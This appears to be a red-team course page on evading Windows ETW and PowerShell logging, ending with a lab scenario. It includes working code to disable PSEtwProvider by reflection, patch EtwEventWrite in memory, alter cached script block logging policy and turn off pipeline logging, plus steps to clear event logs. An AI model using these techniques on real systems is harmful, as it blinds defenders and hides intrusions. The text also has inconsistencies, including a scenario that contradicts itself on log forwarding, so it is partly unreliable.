---
title: "Monitoring Evasion"
date: 2026-10-11
weight: 14
---

## 1. Introduction

- Almost all event logging capability within windows is handled from ETW at both the application and kernel level. 
- While there are other services in place like Event logging, and Trace logging, these are either extensions of ETW or less prevalent to attackers.
- There are mainly 3 components of ETW:

    | Component | Description |
    |-----------|-------------|
    | Controller | Build and configure sessions |
    | Provider | Generate events |
    | Consumer | Collect and process events |

- We will cover each component and how it is instrumented in more depth in the next sections.
- While less important to an attacker than components, event IDs are still a core feature of windows logging. Events are sent and transferred in  XML format which is the standard for how events are defined and implemented by providers.
- At this point, we understand why logging can disrupt an attacker, but how exactly is ETW relavant to a attacker, ETW has visibility over a majority of the operating system, whereas logging generally has limited visibility or details.
- Due to the visibility of ETW, an attacker should always be mindful of events that could be geneated when carrying out their operations. the best approach to taking down ETW is to limit its insight as much as possible into a specifically what you are doing while maintaining the environment integrity.


## 2. Approaches to log evasion
- Before diving deep into the more modern and technical evasion techniques, let's look at the various approaches available and their impacts on attackers and defenders.
- When first thinking about and assessing log evasion, you may think that simply destroying or tampering with the logs may be vialbe.
- Following security best practices, it is typical for a modern environment to employ log forwarding. Log forwarding means that the SOC (Security Operations Center) Team will move or forward logs from host machine to a central server or indexer. Even if an attacker can delete logs from the host machine, the could already be off the device and secured.
- Assuming an attacker did destroy all of the logs before they were forwarded, or if they were not forwarded, how would this raise an alert? An attacker must first consider environment integrity; if no logs originat from a device, that can present serious suspicion and lead to an investigation. Even if an attacker did control logs were removed and forwarded, defenders could still track the tampering.

    | Event ID | Purpose |
    |----------|---------|
    | 1102     | logs when the window security audit logs was cleared |
    | 104      | logs when the log file was cleared |
    | 1100     | logs when the windows event log service was stut down. |

- The above event IDs can monitor the process of destroying logs or "log smashing". this poses a clear risk to attackers attempting to tamer with or destroying logs. although it is possible to bypass these mitigations further with the logs, an attakcer must assess the risk. When approaching an environment, you are generally unaware of security practices and take an OPSECC risk by attempting this approach.

- If the previous approach is too aggressive, how can we strategically approach the problem ?
- An attacker must focus on what logs a malicious technique may result in to keep environment's integrity intact. Knowing what may be instrumented against them, they can utilize or modify published methods to avoid detection..
- Most published techniques will target ETW components since that will allow an attacker the most control over the tracing process.

## 3. Tracing Instrumentation
- ETW is broken up into 3 seperate components, working together to manage and correlate data. 
- Event logs in windows are no different from generic XML data, making it easy to process and interpret.

- Event Controllers are used to build and configure sessions. To expand on this definions, we can think of the controller as the application that determine how and where data will flow. 
    - From Microsoft docs: "Event Controllers are applications that define the size and location of log file, start and stop event tracing sessions, enable providers so they can log events to the sessions, manage the size of buffer pool, and obtain execution statistics for sessions."

- Event Providers are used to generate events. To expand on this definition, the controller will tell provider how to operate, then collect logs from its designated source. 
    - From Microsoft docs: "Event Providers are applications that contain event tracing instrumentation. After a provider registers itself, a controller can then enalbe or disable event tracing in the provider. The provider defines its interpretation of being enabled or disabled. Generally, an enalbed provider generate events, while disabled provider does not."
    - There are four different types of providers: 

    | Provider Type | Description |
    |---------------|-------------|
    | MOF (managed object format) | Defines events form MOF classes, enabled by one trace session at a time |
    | WPP (windows software trace preprocessor) | associated with TMF (Trace message format) files to decode information. Enabled by one trace session at a time |
    | Manifest based | Defines events from a manifest file, enabled by up to 8 trace sessions at a time |
    | Trace Logging | Self describig events containing all required information, enabled by up to 8 trace sessions at a time |

- Event consumers are used to interpret events. To expand on this definition, the consumer will select sessions and parse events from that session or multiple at the same time. This is most commonly seen in the "Event Viewer". 
    - From Microsoft docs: "Event Consumers are applications that select one or more event tracing sessions as a source of events at same time. The system delivers the events in chronological order. Consumers can receive events stored in log files, or from sessions that deliver events in real time."
    - Each of these components can be brough together to fully understand and depict the data/session flow within ETW.

    ![ETW Architecture](/resources_redteam/etw_architecture.png)

- From start to finish, events originat from providers. Controller will determine where data is sent and how its processed through sessions. Consumer will save or deliver logs to be interpreted or analyzed.
- Now understand how ETW is instrumented, how does this apply to attackers ? We previously mentioned the goal of limiting visibility while maintaining integrity. 
- We can limit a specific aspect of insight by targeting components while maintaining most of data flow. 
- Below is brief list of specific techniques that target each ETW component:

    | Component | Technique |
    |-----------|-----------|
    | Providers | PSEtwProvider Modification, Group Policy Takeover, Log Pipeline Abuse, Type Creation | 
    | Controler | Patching EtwEventWrite, Rutime tracing tampering |
    | Consumers | Log smashing, Log tampering |

## 4. Reflection fro Fun and silence
- Withi powershell, ETW providers are loaded into the session from a .Net assembly `PSEtwProvider`. From the Microsoft docs, "Assemblies form the fundamental unit of deployment, version control, reuse, activation scoping, and security permissions for .Net applications." 
- .Net assemblies may seem foreign to some, but we can them familiar by knowing they take shape in familiar formats like `.exe` and `.dll` files.
- In a powershell session, most .Net assemblies are loaded dynamically in same security context as the user at startup. Sicne the sessioni has a same privilage level as the loaded assemblies, we can modify assemby fields and values through powershell session. 
- From Oreilly, "Reflection allows you to look inside an assembly and find out its characteristics. Inside a .Net assembly, information is stored that describes what assembly contains. This is called metadata. A .Net assembly is, in a sense, self-describing, at least if interrogated correctly."
- In the context of ETW, an attacker can reflect the ETW event provider assembly and set the field `m_enabled` to `$null`.
- At a high level, powershell reflection can be broken up into four steps:
    - Obtain .Net assembly for `PSEtwProvider`
    - Retrieve a critical, active EventProvider instance from the assembly
    - Set the field for `m_enabled` to the stored null value.

```powershell
# [Ref] is shortcut to [System.Management.Automation.PSReference], so when we call Assembly upon this, operating system responds with handle to the assembly (dll or exe file) containing the PSReference class..
# [Ref] or [System.Management.Automation.PSReference] are handing us an assembly. In this case its [System.Management.Automation.dll].
# This assembly contains the entire powershell engine and its associated classes.
# And we are immediately filtering for `PSEtwProvider` class which is responsible for ETW logging within that assembly using GetType() method.
$logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwProvider')

# Once we get the assembly instance to the PSEtwProvider class, 
# we will try to get the NonPublic static field `etwProvider` from class itself, rather than from an instance.
# that's why pass $null to GetValue instead of an instance object.
$etwProvider = $logProvider.GetField('etwProvider', 'NonPublic, Static').GetValue($null)

# $etwProvider in step2, is a live instance fetched from static field value of type PSEtwProvider. 
# This is the logging engine that is responsible for sending events to Controller from current powershell session.
# And we are looking to turn this engine off by setting its `m_enabled` field to 0.
# 
# $etwProvider is an instance of System.Diagnostics.Eventing.EventProvider, specific to current powershell session.
# $etwProvider has two field:
#   - m_enabled: provider is enabled (1) or not (0), controlls the events sent to Controller.
#   - Destination: etw controller address, where events are sent
# Our goal is to disable event logging by setting current session' provider's m_enabled field to 0. 
# i.e we need set $etwProvider.m_enabled = 0.
# but m_enalbed is a strict private field, .Net run time explicity block us from accessing it using standard dot-notation.
# To bypass this restriction, we will get offset to the m_enalbed field from start of the object using actual EventProvider class which lives in [System.Diagnostics.Eventing] assembly.
# here, $meshField is offset to m_enabled field from the start of the object, not 0 or 1.
$meshField = [System.Diagnostics.Eventing.EventProvider].GetField('m_enabled', 'NonPublic,Instance')
# Once we get the offset, and we will set the value at this offset to 0. 
# Which is equivalent to setting $etwProvider.m_enabled = 0 bypassing .Net runtime restrictions.
$meshField.SetValue($etwProvider, 0)


# we can compile these steps together and append them to a malicious script.
# Use the powershell script provided and xperiment with this technique
# To prove the efficiecy of the script, we can execute above malicious script and measure the number of returned events for whoami command.

Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure-Object | % Count # should be 0
whoami
Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure-Object | % Count # should be 0 
```

## 5. Patching Tracing Functions
- By default, .Net runtime (CLR - Common Language Runtime) loads an ETW provider for each process that uses .Net framework.
- Within these processes, ETW provider sends events (related process activities) from userland to ETW controller, if an attacker can write prodefined opcodes to an in-memory function of ETW provider to patch and disable functionality of event logging.
- What we are doing here at high level, we are trying to force an application's function to return quickly before reaching actual event logging code.
- If we can identify we identify memory location of this function where event logging happens, we can write opcodes of `ret` instruction at very beginning of that function, and expect it return immediately without executing event logging code.

### 5.1 Basics of memory management
- **Function**: A function's execution is broken into 3 phases: 
    - the `Prologue` - Involved in setting up the function's stack frame including Base Pointer (EBP) & Stack Pointer (ESP) and preparing for function execution.
    - the `Body` - Your actual C code executes here.
    - and the `Epilogue` - Cleans up the stack frame and returns control to the caller.

- **Stack**: Last In, First Out (LIFO) data structure that manages function calls and local variables. 
    - Stack always grows downward in memory (towards lower addresses).
    - `Stack pointer (SP)` is a register that always points to the top of the stack.
    - When a something is pushed (PUSH) to the stack, Stack grows downward, and value of Stack pointer (SP) decreases.
    - When a something is popped (POP) from the stack, Stack grows upward, and value of Stack pointer (SP) increases.
    - `Stack Pointer (ESP)` is highly volatile. It moves up and down constantly as data is pushed and popped within the function body.

- **Heap**: Dynamic memory allocation for objects and data structures and its managed by OS and application.
    - Heap grows upward in memory (towards higher addresses).

- **Stack Frame**: Stack frame is a region of memory allocated for a function call.
    - Stack frame is created when a function is called and destroyed when function returns.
    - Arguments (4-byte each) passed to function are stored at very beginning of stack frame for 32-bit System. However, in 64-bit System, arguments are passed in registers like RCX, RDX, R8, R9, and this space in stack frame only exists if the function takes 5 or more parameters.
    - Once allocation of arguments completed in stack frame, next 4 bytes contains `return address` which is exact memory location the CPU jumps back to when this function finishes.
    - Next 4 bytes are saved value of EBP register whose value is the address of the previous function's base pointer.
    - Next few bytes contain security cookie to detect buffer overflows and other memory corruption attacks.
    - And next bytes contain local variables.
    - And this keeps growing downward as more local variables are declared.

- **Base pointer (EBP)**: A register that stores a memory address on a stack frame, which contains the address of the previous function's base pointer.
    - EBP is a register inside the CPU. It holds a memory address. If you follow that memory address into the RAM, you land exactly on the slot in the current stack frame where the previous function's base pointer value was backed up.
    - All the registers do not live in Memory, but they stay inside the CPU.
    - The compiler uses EBP as a fixed anchor to the current stack frame. Once EBP is set up in the prologue, it does not change its value for the entire duration of the function. where as ESP changes constantly.
    - This fixed anchor of EBP allows the compiler to calculate the address of local variables and function parameters relative to EBP, making the code more predictable and easier to debug.
    - Arguments passed to function are always at positive offsets from EBP.
    - Local variables are always at negative offsets from EBP.  
 
- **Stack Pointer (ESP)**: A register that points to the current top of the stack in memory.
    - ESP is a register inside the CPU. It holds a memory address. If you follow that memory address into the RAM, you land exactly on the slot in the current stack frame where the next value will be pushed or popped.
    - ESP changes constantly as values are pushed onto or popped off the stack.


```
       +------------------------------------+   <-- Stack "bottom" (Higher Memory Addresses)
       |                .                   |
       |                .                   |  } Earlier frames
       |                .                   |
       +------------------------------------+
       |                .                   |
       |                .                   |
+4+4n  |             Argument n             |
       |                .                   |
       |                .                   |  } Caller's frame
  +8   |             Argument 1             |
       +------------------------------------+
  +4   |           Return address           |
       +------------------------------------+
   0   |             Saved %ebp             |  <-- Frame pointer (%ebp)
       +------------------------------------+
  -4   |     security cookie / canary       |
       +------------------------------------+
  -8   |          Saved registers,          |
       +------------------------------------+
  -12  |          local variables,          |
       +------------------------------------+
       |           and temporaries          |
       |                                    |  } Current frame
       +------------------------------------+
       |            Argument                |
       |           build area               |
       +------------------------------------+   <-- Stack pointer (%esp)
                                                (Stack "top" / Lower Memory Addresses)
```

### 5.2 Time for Patching 
- When .Net process loads assemblies, start thread, or interact with operating system, it routes of all these meta data information to ETW Controller through user-mode API inside ntdll.dll called `EtwEventWrite`.
- The Concept of patching involves a process altering its own memory mapping. Because ntdll.dll is mapped directly into the virtual memory space of the process, an application with appropriate privileges local permissions can use APIs like `VirtualProtect` to change memory permission from read-execute to writeable.
- After making memory writeable, the application can patch the `EtwEventWrite` function to return immediately without logging the event.
- This technique is known as "ETW patching" or "ETW bypass".
- Before we actually patch, lets look at assembly code for epilogue of 32-bit windows system function (found in ntdll.dll), where it contains explicit security defence layer before dismantling stack frame.
```bash
# A security validation
# CPU fetches the security cookie that placed on stack at very beginining of the function.
# XORed the security cookie with stack pointer (ESP) and placed in ECX register.
# ntdll!security_check_cookie validates the XORed value in ECX register with the security cookie.
# If a buffer overflow has occured and smashed stack, the cookie will be corrupted and this call will terminate the process immediately to prevent arbitary code execution.
xor     ecx, esp
call    ntdll!security_check_cookie

# A standard tear down sequence
# CPU resets the Stack pointer (ESP) to Fixed base pointer (EBP), discarding all the local variables and temporary data instantly.
# This happens as when ESP point EBP, ESP will move up and discard all data below it.
mov     esp, ebp
# Next instruction, pops the value from top of stack into the EBP
#    - As this is pop, ESP moves 4 bytes up, pointing to return address.
#    - Now EBP loads with saved base pointer value of parent function's stack frame.
pop     ebp
# This is a conditional return instruction using __stdcall convention.
# As now ESP points to 4-byte return address, this instruction pops this address from stack to jump back to the caller.
# And then adds 0x14 (20 in decimal) bytes to ESP, to let it move up and effectively discards 5 arguments (5 * 4 bytes = 20 bytes),
# That parent function has pushed onto the stack before the call occured.
# And then adds 0x14 (20 )
ret     14h
```
- From above epilogue for 32-bit windows system function, we can see a standard pattern where stack frame is torn down in a specific order, and then return instruction jumps back to the caller.
- Ok, what happens when a caller trying to execute `EtwEventWrite` function?, the following happens
    - Caller pushes 5 arguments onto the stack (ESP moves down by20 bytes)
    - Caller executes `call EtwEventWrite` (ESP moves down by 4 bytes to push return address), ESP now points to return address
    - CPU jumps the Instruction Pointer `EIP` to the very first byte of `EtwEventWrite` function
    - At this millisecond, the prologue has not run yet, EBP still points to parent function's stack frame, and ESP points to return address, and no local variables are allocated yet.
    - If we can patch the `ret 14h` instruction at the very first byte of this function
        - CPU hits `ret 14h` instruction in first byte instead of prologue
        - so, CPU pops the return address from top of stack (ESP) and jumps to it, and then adds 0x14 (20) bytes to ESP, effectively discarding all 5 arguments that were pushed onto the stack.
        - This means, the function returns immediately without executing any code, and the caller thinks the function executed successfully.
        
- The `ret 14h` instruction is also represented as `C21400` in hexadecimal format, where `C2` is the opcode for `ret` instruction, and `1400` is the argument size in little-endian format.
- Lets do some programming ..
```cs
// get handle to ntdll.dll, and get address of EtwEventWrite funtion. 
// Here, GetProcAddress mean get procedure address.
var ntdll = Win32.LoadLibrary("ntdll.dll");
var etwFunction = Win32.GetProcAddress(ntdll, "EtwEventWrite");

// We need to have a predefined opcode to patch
byte[] patch = [0xC2, 0x14, 0x00]; // ret 14h

// get some permssion to write into this memory location
uint oldProtect;
Win32.VirtualProtect(etwFunction, (UIntPtr)patch.Length, 0x40, out oldProtect);

// the target address (etwFunction) is an unmanaged raw memory pointer (IntPtr). 
// C# arrays live in the managed heap (controlled by the Garbage Collector). 
// You cannot use standard C# assignment (=), memcpy, or CopyMemory to write managed data directly to a raw memory pointer,
// as managed memory can be actively shifted around in physical RAM by the GC at any millisecond
// Marshal.Copy acts as the bridge to safely copy bytes from managed memory to unmanaged memory.

Marshal.Copy(patch, 0, etwFunction, patch.Length);

// Lets clear our traces, restore original permissions
Win32.VirtualProtect(etwFunction, (UIntPtr)patch.Length, oldProtect, out oldProtect);

// we can ensure Instruction cache is flushed, so that CPU fetches the patched code
Win32.FlushInstructionCache(Win32.GetCurrentProcess(), etwFunction, (UIntPtr)patch.Length);
```

- We can compile these steps teghether and append them to a malicious script or session.
- After the opcode is written, we can view the dismantled function `EtwEventWrite` using a debugger  to confirm the patch.
- Once the function is patched in memory, it always returns immediately when `EtwEventWrite` is called.
- Although this is a beautifully crafted technique, it might not be the best approach depending on environment since it may restrict more logs than you want for integrity.



## 6. Providers via Policy

- ETW has lot of coverage out of the box, but it will disable some features unless specified because of amount of logs they can create.
- These features can be enabled by modifying the GPO (Group Policy object) setting of their parent policy. 
- Two of the most popular GPO providers provide covarage over Powershell, including `script block logging` and `module logging`.

- Script block logging will log any script block executed within a powershell. Introduced in powershell v4 and improved in powershell v5, the etw provider has two event IDs it will report

| Event ID | Description |
|----------|-------------|
| 4103 | Logs command invocation |
| 4104 | logs script block evasion |

- Event ID 4104 is most prevalent to attackers and can expose their script if not properly obfuscated or hidden. 
- Module logging is very verbose provider that will log any module and data sent from it. Introduced in powershell v3, each module within powershell session act as a provider and logs its own module. Similar to the previous provider, the module will write events to event ID 4103. 
- Event ID 4103 is less prevalent to attackers because of the amount of logs created. this can often result in being treated with less severity or being disabled completely.
- Although attackers have ETW patches available, they may not always be practical or the best approach to evade logging.As an alternative, attackers can target these providers to slowly limit visibility while not being as obvious or noisy as other attacks techniques.



## 7. Group Policy Takeover
- The module logging and script block logging are both enalbed from group policy, specifically `Administrative Templates\Windows Components\Windows PowerShell`.
- As mentioned before, with powershell session, system assemblies are loaded in the same security context as users, this means an attacker has the same privilege level as the assemblies that cache GPO Settings. Using reflection, an attacker can obtain the utility dictionary and modify the group policy cache for either of these powershell providers.
- At high level, a group policy takeover can be broken up into 3 steps:
    - Obtain group policy settings from the utility cache
    - Modify the generic provider to 0.
    - Modify the invocation or module definition
- We will break down an example powershell script to identify each step and explain each in depth below
```powershell
# we must use reflection to obtain Assembly instance for `System.Management.Automation.Utils` and identify the GPO cache field.
$utilsAssemblyInstance = [Ref].Assembly.GetType("System.Management.Automation.Utils")
$GroupPolicySettingsField = $utilsAssemblyInstance.GetField("cachedGroupPolicySettings", 'NonPublic,Static')
$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)

# we can leverage the GPO variable to modify either event provider settings to 0
# EnalbeScriptBlockLogging will control 4104 events, limiting the visibility of script execution.
# Modification can be accomplished by writign to the object or registry directly
$GroupPolicySettings["ScriptBlockLogging"]["EnableScriptBlockLogging"] = 0

# we can repeat the same for other provider settings
$GroupPolicySettings["ScriptBlockLogging"]["EnableScriptBlockInvocationLogging"] = 0

# we can compile these steps together and append them to malicious powershell script.
# to prove the efficiency of scirpt, we can execute it and measure the number of returned events from a given command
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell'; Id=4104} | Measure | % Count # before execution
whoami
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell'; Id=4104} | Measure | % Count # after execution, must be same as before.
```

## 8. Abusing Log Pipeline
- Within powershell, each module or snap-in has a setting that anyone can use to modify its logging functionality.
- From the microsoft docs, "When LogPipelineExecutionDetails property value is TRUE, windows powershell writes cmdlet and function execution events in the session to the windows powershell log in Event viewer". 
- An attacker can change this value to $false in any powershell session to disable a module logging for that specific session. 
- Microsoft docs even note that ability to disable logging from user session, "To disable logging, use the same command sequence to set the property value to $false".
- At high level the log pipeline technique can be broken into 4 steps:
    - Obtain the target variable
    - Set the module execution details to $false
    - Obtain the module snap-in 
    - Set the module snap-in details to $false

```powershell
$module = Get-Module Microsoft.PowerShell.Utility
$module.LogPipelineExecutionDetails = $false
$snap = Get-Module Microsoft.PowerShell.SnapIn
$snap.LogPipelineExecutionDetails = $false

# This script block above can be appended to any powershell script or run in session to disable module logging of the currently imported modules
```

## 9. Real World Scenario
- In this scenario, you are a red team operator assigned to build an evasive script to disable ETW and execute a compiled binary.
- In this scenario, environment integrity is crucial, and blue team is actively monitoring the enviornment. Your team has informed you that they are primarily concerned about with monitoring web traffic for suspicious logs;
- However, they are not forwarded logs. Using knowledge gained in this class, crate a script to execute a binary or command without interference.
- **Solution:**
    - To begin this scenario, we need to consider the environment that we are in. We are given the information that they are monitoring web traffic,  but how are they accomplishing that, Do they have powershell logging enabled ? do they have sysmon installed ? 
    - Most of these questions can be answered through manual enumeration or looking for the setttings to enable features as discussed in this class.
    - With some enumeration, we can identify that powershell script block and module logging are enabled. Our best approach to this problem is to disable both GPO settings from the cache for our powershell session. this can be accomplished by using GPO bypass technique.
    - Great From now on our session is silent, but what about those pesky logs that are generated when script ran ? From information provided we know logs are being forwarded so we can delete any 4104 or 4103 logs that were generated.
    - Because internet connection is not originating from powershell we dont need to worry about it being disturbed in our silent session.
    - To remove the logs, we can use the GUI Event Viewer or Remove-EventLog in powershell.
    - Powershell script blocks are located in Microsoft/Windows/Powershell/Operational/ or Microsoft-Windows-PowerShell. We can then select clear log under actions in the Gui or run the Powerhsell cmdlet to remove the necessary logs.
    - At this point, we should have all the parameters met:
        - Disable logging needed
        - Maintain environment integrity
        - clean our tracks

    - Now we can test our methodology by running the binary agent.exe. If properly implemented a flag will be returned to the desktop.
    - If not properly implemented, "binary leaked, you got caught" will appear, meaning that binary appered in the logs at some point, and you failed in this scenerio.













